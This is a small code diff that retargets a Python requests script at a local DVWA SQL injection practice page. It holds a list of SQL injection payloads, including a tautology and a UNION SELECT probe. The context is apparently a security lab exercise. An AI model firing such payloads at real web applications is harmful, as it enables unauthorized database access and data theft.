@@ -1,6 +1,6 @@
 import requests
 
-url = "https://httpbin.org/get?id="
+url = "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id="
 
 payloads = ["1'", "1'--", "1' OR '1'='1", "1' UNION SELECT null,null--"]
 
